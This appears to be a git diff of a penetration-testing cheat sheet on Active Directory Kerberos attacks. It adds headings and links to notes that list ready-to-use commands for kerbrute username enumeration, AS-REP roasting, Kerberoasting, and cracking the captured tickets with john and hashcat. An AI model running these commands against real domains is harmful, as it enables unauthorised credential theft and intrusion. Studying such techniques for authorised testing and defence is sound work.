@@ -50,13 +50,19 @@ Domain()
 ###### Kerberos ~ validating usernames
 ```
 https://github.com/ropnop/kerbrute
-./kerbrute userenum --dc 10.10.10.10 -d domain.htb users
+./kerbrute userenum --dc 10.10.10.10 -d domain.htb users.txt
 ```
 
 
 ###### Kerberos ~ AS-REP Roasting
 ```
+From external:
 > impacket-GetNPUsers domain.local/ -format john -usersfile wordlist -no-pass -dc-ip 10.10.10.10
+
+From internal:
+https://pentestbook.six2dez.com/post-exploitation/windows/ad/kerberos-attacks
+
+Password dictionary attack:
 > john tgt-file --wordlist=/usr/share/wordlists/rockyou.txt
 or:
 > hashcat -a 0 -m 18200 tgt-file /usr/share/wordlists/rockyou.txt --force
@@ -64,15 +70,23 @@ or:
 
 ###### Kerberos ~ Kerberoasting
 ```
+From external:
 > GetUserSPNs.py -request -dc-ip 10.10.10.10 domain.local/username -save -outputfile tgsfile.out
 
+From internal:
+https://pentestbook.six2dez.com/post-exploitation/windows/ad/kerberos-attacks
+
+
+Password dictionary attack:
 > hashcat -m 13100 -a 0 tgsfile.out /usr/share/wordlists/rockyou.txt --force
 or:
 > python3 /usr/share/kerberoast/tgsrepcrack.py wordlist.txt ticketname
 ```
 
-///
-GetST
+###### Kerberos ~ Overpass The Hash / Pass the key
+```
+https://pentestbook.six2dez.com/post-exploitation/windows/ad/kerberos-attacks
+```
 
 
 ##### DS-SYNC attacks
